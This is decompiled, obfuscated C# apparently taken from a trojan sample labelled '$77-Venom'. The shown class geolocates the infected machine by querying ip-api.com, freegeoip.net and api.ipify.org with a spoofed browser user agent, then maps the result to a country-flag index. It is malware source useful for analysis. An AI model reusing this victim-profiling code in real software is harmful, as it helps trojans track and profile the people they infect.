// Decompiled with JetBrains decompiler
// Type: ∓犥ﬞ暍덜쭐�晁ꐞ�བ劉项놝ꬨ�ᴎ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.IO;
using System.Net;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Xml;

public static class \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ
{
  public static readonly string[] 잨些씷芁窺\uF067ㆲᾁ\u2BD1㐷쒄屸꺞\uF592短㐾墲謟ꖣ\uF028 = new string[247]
  {
    "ad",
    "ae",
    "af",
    "ag",
    "ai",
    "al",
    "am",
    "an",
    "ao",
    "ar",
    "as",
    "at",
    "au",
    "aw",
    "ax",
    "az",
    "ba",
    "bb",
    "bd",
    "be",
    "bf",
    "bg",
    "bh",
    "bi",
    "bj",
    "bm",
    "bn",
    "bo",
    "br",
    "bs",
    "bt",
    "bv",
    "bw",
    "by",
    "bz",
    "ca",
    "catalonia",
    "cc",
    "cd",
    "cf",
    "cg",
    "ch",
    "ci",
    "ck",
    "cl",
    "cm",
    "cn",
    "co",
    "cr",
    "cs",
    "cu",
    "cv",
    "cx",
    "cy",
    "cz",
    "de",
    "dj",
    "dk",
    "dm",
    "do",
    "dz",
    "ec",
    "ee",
    "eg",
    "eh",
    "england",
    "er",
    "es",
    "et",
    "europeanunion",
    "fam",
    "fi",
    "fj",
    "fk",
    "fm",
    "fo",
    "fr",
    "ga",
    "gb",
    "gd",
    "ge",
    "gf",
    "gh",
    "gi",
    "gl",
    "gm",
    "gn",
    "gp",
    "gq",
    "gr",
    "gs",
    "gt",
    "gu",
    "gw",
    "gy",
    "hk",
    "hm",
    "hn",
    "hr",
    "ht",
    "hu",
    "id",
    "ie",
    "il",
    "in",
    "io",
    "iq",
    "ir",
    "is",
    "it",
    "jm",
    "jo",
    "jp",
    "ke",
    "kg",
    "kh",
    "ki",
    "km",
    "kn",
    "kp",
    "kr",
    "kw",
    "ky",
    "kz",
    "la",
    "lb",
    "lc",
    "li",
    "lk",
    "lr",
    "ls",
    "lt",
    "lu",
    "lv",
    "ly",
    "ma",
    "mc",
    "md",
    "me",
    "mg",
    "mh",
    "mk",
    "ml",
    "mm",
    "mn",
    "mo",
    "mp",
    "mq",
    "mr",
    "ms",
    "mt",
    "mu",
    "mv",
    "mw",
    "mx",
    "my",
    "mz",
    "na",
    "nc",
    "ne",
    "nf",
    "ng",
    "ni",
    "nl",
    "no",
    "np",
    "nr",
    "nu",
    "nz",
    "om",
    "pa",
    "pe",
    "pf",
    "pg",
    "ph",
    "pk",
    "pl",
    "pm",
    "pn",
    "pr",
    "ps",
    "pt",
    "pw",
    "py",
    "qa",
    "re",
    "ro",
    "rs",
    "ru",
    "rw",
    "sa",
    "sb",
    "sc",
    "scotland",
    "sd",
    "se",
    "sg",
    "sh",
    "si",
    "sj",
    "sk",
    "sl",
    "sm",
    "sn",
    "so",
    "sr",
    "st",
    "sv",
    "sy",
    "sz",
    "tc",
    "td",
    "tf",
    "tg",
    "th",
    "tj",
    "tk",
    "tl",
    "tm",
    "tn",
    "to",
    "tr",
    "tt",
    "tv",
    "tw",
    "tz",
    "ua",
    "ug",
    "um",
    "us",
    "uy",
    "uz",
    "va",
    "vc",
    "ve",
    "vg",
    "vi",
    "vn",
    "vu",
    "wales",
    "wf",
    "ws",
    "ye",
    "yt",
    "za",
    "zm",
    "zw"
  };

  public static int ImageIndex { get; set; }

  public static \uF84D創鐢\uEF66蘱ᄫ䢊桵寛\uEFB3㷖ᦩ蠨뷤杼䠦꼹\uF0F6도\uF2AF GeoInfo { get; private set; }

  public static DateTime LastLocated { get; private set; }

  public static bool LocationCompleted { get; private set; }

  static \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ() => \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LastLocated = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);

  public static void ᥧ澪矑\uF144晅ﴓ冮ೂ褳畺뚠궷\uEEF6秪彀Ⲧ掲焲幈ﲥ()
  {
    TimeSpan timeSpan;
    ref TimeSpan local = ref timeSpan;
    DateTime dateTime = DateTime.UtcNow;
    long ticks1 = dateTime.Ticks;
    dateTime = \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LastLocated;
    long ticks2 = dateTime.Ticks;
    long ticks3 = ticks1 - ticks2;
    local = new TimeSpan(ticks3);
    if (timeSpan.TotalMinutes <= 30.0 && \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LocationCompleted)
      return;
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ズ湏\u2B50\uFFFD荡\uEB2B\u2F11琾ḥ䲅崤㿯慺\uF59C\u2270ᙰ\uF0CE\uE384﻿硤();
    if (string.IsNullOrEmpty(\u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.CountryCode) || string.IsNullOrEmpty(\u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Country))
    {
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ImageIndex = 247;
    }
    else
    {
      for (int index = 0; index < \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.잨些씷芁窺\uF067ㆲᾁ\u2BD1㐷쒄屸꺞\uF592短㐾墲謟ꖣ\uF028.Length; ++index)
      {
        if (\u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.잨些씷芁窺\uF067ㆲᾁ\u2BD1㐷쒄屸꺞\uF592短㐾墲謟ꖣ\uF028[index] == \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.CountryCode.ToLower())
        {
          \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ImageIndex = index;
          break;
        }
      }
    }
  }

  private static void ズ湏\u2B50\uFFFD荡\uEB2B\u2F11琾ḥ䲅崤㿯慺\uF59C\u2270ᙰ\uF0CE\uE384﻿硤()
  {
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LocationCompleted = false;
    try
    {
      DataContractJsonSerializer contractJsonSerializer = new DataContractJsonSerializer(typeof (\uF84D創鐢\uEF66蘱ᄫ䢊桵寛\uEFB3㷖ᦩ蠨뷤杼䠦꼹\uF0F6도\uF2AF));
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://ip-api.com/json/");
      httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
      httpWebRequest.Proxy = (IWebProxy) null;
      httpWebRequest.Timeout = 10000;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          using (StreamReader streamReader = new StreamReader(responseStream))
          {
            using (MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(streamReader.ReadToEnd())))
              \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo = (\uF84D創鐢\uEF66蘱ᄫ䢊桵寛\uEFB3㷖ᦩ蠨뷤杼䠦꼹\uF0F6도\uF2AF) contractJsonSerializer.ReadObject((Stream) memoryStream);
          }
        }
      }
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LastLocated = DateTime.UtcNow;
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LocationCompleted = true;
    }
    catch
    {
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.㶖导\u2AD4\uE743㭟\u24BB퍉揃䲔䟥๘ԕ\u2261孑\u2B8D\u2B27Թ\uA491ా\uE0C6();
    }
  }

  private static void 㶖导\u2AD4\uE743㭟\u24BB퍉揃䲔䟥๘ԕ\u2261孑\u2B8D\u2B27Թ\uA491ా\uE0C6()
  {
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo = new \uF84D創鐢\uEF66蘱ᄫ䢊桵寛\uEFB3㷖ᦩ蠨뷤杼䠦꼹\uF0F6도\uF2AF();
    try
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://freegeoip.net/xml/");
      httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
      httpWebRequest.Proxy = (IWebProxy) null;
      httpWebRequest.Timeout = 10000;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          using (StreamReader streamReader = new StreamReader(responseStream))
          {
            string end = streamReader.ReadToEnd();
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(end);
            string innerXml1 = xmlDocument.SelectSingleNode("Response//IP").InnerXml;
            string innerXml2 = xmlDocument.SelectSingleNode("Response//CountryName").InnerXml;
            string innerXml3 = xmlDocument.SelectSingleNode("Response//CountryCode").InnerXml;
            string innerXml4 = xmlDocument.SelectSingleNode("Response//RegionName").InnerXml;
            string innerXml5 = xmlDocument.SelectSingleNode("Response//City").InnerXml;
            string innerXml6 = xmlDocument.SelectSingleNode("Response//TimeZone").InnerXml;
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Ip = !string.IsNullOrEmpty(innerXml1) ? innerXml1 : "-";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Country = !string.IsNullOrEmpty(innerXml2) ? innerXml2 : "Unknown";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.CountryCode = !string.IsNullOrEmpty(innerXml3) ? innerXml3 : "-";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Region = !string.IsNullOrEmpty(innerXml4) ? innerXml4 : "Unknown";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.City = !string.IsNullOrEmpty(innerXml5) ? innerXml5 : "Unknown";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Timezone = !string.IsNullOrEmpty(innerXml6) ? innerXml6 : "Unknown";
            \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Isp = "Unknown";
          }
        }
      }
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LastLocated = DateTime.UtcNow;
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LocationCompleted = true;
    }
    catch
    {
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Country = "Unknown";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.CountryCode = "-";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Region = "Unknown";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.City = "Unknown";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Timezone = "Unknown";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Isp = "Unknown";
      \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.LocationCompleted = false;
    }
    if (!string.IsNullOrEmpty(\u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Ip))
      return;
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.㙃庮쮕椤\u2343\uFFFDꑝൿ\uE2D6톰䎍\uEBE9籭骐㛂䟩ꠓ脌繿\u1CAF();
  }

  private static void 㙃庮쮕椤\u2343\uFFFDꑝൿ\uE2D6톰䎍\uEBE9籭骐㛂䟩ꠓ脌繿\u1CAF()
  {
    string str = "-";
    try
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://api.ipify.org/");
      httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
      httpWebRequest.Proxy = (IWebProxy) null;
      httpWebRequest.Timeout = 5000;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          using (StreamReader streamReader = new StreamReader(responseStream))
            str = streamReader.ReadToEnd();
        }
      }
    }
    catch (Exception ex)
    {
    }
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Ip = str;
  }
}
